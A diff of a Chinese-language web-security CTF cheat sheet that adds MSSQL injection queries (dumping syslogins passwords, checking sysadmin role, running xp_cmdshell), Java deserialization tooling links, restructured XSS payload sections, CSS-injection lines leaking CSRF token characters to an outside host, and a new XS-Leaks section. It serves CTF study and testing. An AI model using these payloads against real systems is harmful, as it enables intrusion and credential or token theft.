@@ -28,6 +28,8 @@ Table of Contents
     * [Python Pickle](#python-pickle)
     * [Ruby Marshal](#rubyrails-marshal)
     * [Ruby YAML](#rubyrails-yaml)
+    * [Java Serialization](#java-deserialization)
+    * [.NET Serialization](#net-derserialization)
 *  [SSTI](#ssti)
     * [Flask/Jinja2](#flaskjinja2)
     * [AngularJS](#angularjs)
@@ -42,7 +44,12 @@ Table of Contents
     * [Finger Print](#fingerprint)
 *  [XXE](#xxe)
     * [Out of Band XXE](#out-of-band-oob-xxe)
-*  [XSS](#xss)
+    * [Error-based XXE](#error-based-xxe)
+*  [Frontend](#frontend)
+    * [XSS](#xss)
+    * [RPO](#rpo)
+    * [CSS Injection](#css-injection)
+    * [XS-Leaks](#xs-leaks)
 *  [Crypto](#密碼學)
     * [PRNG](#prng)
     * [ECB mode](#ecb-mode)
@@ -589,6 +596,9 @@ Request: `http://kaibro.tw/test.php?url=%67%67`
     - timestamp要一致
 - https://github.com/GoSecure/php7-opcache-override
     - Disassembler可以把Byte code轉成Pseudo code
+
+- Example
+    - [0CTF 2018 Qual - EzDoor](https://github.com/w181496/CTF/tree/master/0ctf2018_qual/EzDoor)
 
 ## PCRE回溯次數限制繞過
 
@@ -1242,10 +1252,22 @@ pop graphic-context
     - 取第78~87筆
         - `SELECT pass FROM (SELECT pass, ROW_NUMBER() OVER (ORDER BY (SELECT 1)) AS LIMIT FROM mydb.dbo.mytable)x WHERE LIMIT between 78 and 87`
 - 其它：
+    - user
     - db_name()
     - user_name()
+    - @@version
+    - @@language
     - @@servername
     - host_name()
+    - has_dbaccess('master')
+- 查詢用戶 
+    - `select name, loginame from master..syslogins, master..sysprocesses`
+- 查用戶密碼 
+    - `select user,password from master.dbo.syslogins`
+- 當前角色是否為資料庫管理員
+    - `SELECT is_srvrolemember('sysadmin')`
+- 當前角色是否為db_owner
+    - `SELECT  IS_MEMBER('db_owner')`
 - 爆DB name
     - ```DB_NAME(N)```
     - ```UNION SELECT NULL,DB_NAME(N),NULL--```
@@ -1261,6 +1283,7 @@ pop graphic-context
     - `SELECT table_catalog, table_name, column_name FROM information_schema.columns`
     - `SELECT name FROM syscolumns WHERE id=object_id('news')`
     - `ID=1337';if (select top 1 col_name(object_id('table_name'), i) from sysobjects)>0 select 1--`
+    - `SELECT name FROM DBNAME..syscolumns WHERE id=(SELECT id FROM DBNAME..sysobjects WHERE name='TABLENAME')`
 - Union Based
     - Column型態必須相同
     - 可用`NULL`來避免
@@ -1285,6 +1308,10 @@ pop graphic-context
     EXEC sp_configure 'xp_cmdshell',1
     RECONFIGURE
     ```
+
+    - 執行 command
+        - `exec xp_cmdshell 'whoami'`
+
     - 關閉xp_cmdshell
     
     ```
@@ -2084,9 +2111,12 @@ print marshalled
     - [gadgetinspector](https://github.com/JackOfMostTrades/gadgetinspector)
         - Bytecode Analyzer
         - 找 gadget chain
+    - [GadgetProbe](https://github.com/BishopFox/GadgetProbe)
+        - 透過字典檔配合DNS callback，判斷環境使用哪些library, class等資訊
 - [Java-Deserialization-Cheat-Sheet](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet)
 - Example
     - [0CTF 2019 Final - hotel booking system](https://balsn.tw/ctf_writeup/20190608-0ctf_tctf2019finals/#tctf-hotel-booking-system)
+    - [TrendMicro CTF 2018 Qual - Forensics 300](https://github.com/balsn/ctf_writeup/tree/master/20180914-trendmicroctf#300-3)
     - [TrendMicro CTF 2019 Qual - Forensics 300](https://github.com/w181496/CTF/tree/master/trendmicro-ctf-2019/forensics300)
     - TrendMicro CTF 2019 Final - RMIart
 
@@ -2531,9 +2561,11 @@ xxe.dtd:
 - PDF
 - https://github.com/BuffaloWill/oxml_xxe
 
-# XSS
+# Frontend
 
-## Basic Payload
+## XSS
+
+### Basic Payload
 
 - `<script>alert(1)</script>`
 - `<svg/onload=alert(1)>`
@@ -2543,7 +2575,7 @@ xxe.dtd:
 - `<iframe src="javascript:alert(1)"></iframe>`
 - ...
 
-## Testing
+### Testing
 
 - `<script>alert(1)</script>`
 - `'"><script>alert(1)</script>`
@@ -2555,7 +2587,7 @@ xxe.dtd:
 - `javascript:alert(1)//`
 - ....
 
-## 繞過
+### 繞過
 
 - `//`(javascript註解)被過濾時，可以利用算數運算符代替
     - `<a href="javascript:alert(1)-abcde">xss</a>`
@@ -2642,11 +2674,11 @@ xxe.dtd:
         - wave在apache mime type中沒有被定義
         - `<script src="uploads/this_file.wave">`
 
-## CSP evaluator
+### CSP evaluator
 
 https://csp-evaluator.withgoogle.com/
 
-## Bypass CSP
+### Bypass CSP
 
 - base
     - 改變資源載入的域，引入惡意的js
@@ -2686,13 +2718,13 @@ https://csp-evaluator.withgoogle.com/
     - Google CTF 2018 - gcalc2
 
 
-## Online Encoding / Decoding
+### Online Encoding / Decoding
 - http://monyer.com/demo/monyerjs/
 
-## JSFuck
+### JSFuck
 - http://www.jsfuck.com/
 
-## aaencode / aadecode
+### aaencode / aadecode
 - http://utf-8.jp/public/aaencode.html
 - https://cat-in-136.github.io/2010/12/aadecode-decode-encoded-as-aaencode.html
 
@@ -2721,7 +2753,49 @@ https://csp-evaluator.withgoogle.com/
     - `input[name=csrf][value^="2"]{background: url(http://kaibro.tw/2)}`
     - `input[name=csrf][value^="2e"]{background: url(http://kaibro.tw/2e)}`
     - ...
-    - SECCON CTF 2018 - GhostKingdom
+    - [SECCON CTF 2018 - GhostKingdom](https://github.com/w181496/CTF/tree/master/seccon2018-qual/GhostKingdom)
+
+
+## XS-Leaks
+
+- Cross-Site Browser Side channel attack
+- [xsleaks wiki](https://github.com/xsleaks/xsleaks/wiki/Browser-Side-Channels)
+
+### Frame count
+- 不同狀態有不同數量的frame
+- 用 `window.frames.length` 來判斷
+    - 狀態A => frame count = x
+    - 狀態B => frame count = y
+    - x != y
+- e.g. [Facebook CTF - Secret Note Keeper](https://github.com/w181496/CTF/tree/master/fbctf2019/secret_note_keeper)
+    - 找到結果 => frame count >= 1
+    - 沒找到 => frame count = 0
+
+### Timing
+- 不同狀態有不同回應時間
+- Time(有結果) > Time(沒結果)
+    - 有結果時，會需要載入比較多東西
+
+### XSS Filter
+- iframe正常訪問，會觸發一次onload事件
+- 在iframe.src尾，加上`#`做請求，正常不會再觸發onload事件
+- 但如果原本頁面被filter block，則會有第二次onload
+    - 第二次請求變成`chrome-error://chromewebdata/#`
+- 可以判斷頁面狀態
+    - 正常 => 1次onload
+    - 被Blocked => 2次onload
+- 也能用`history.length`判斷
+- e.g. 35C3 - filemanager
+
+### HTTP Cache
+- 清空目標 Cache
+    - 送 POST 請求
+- 查詢內容
+    - `<link rel=prerender href="victim.com">`
+- 檢查是否 Cache 該內容
+    - Referrer 設超長，然後訪問該資源
+    - 有 cache => 顯示資源
+    - 沒 cache => 抓不到資源
 
 # 密碼學
 
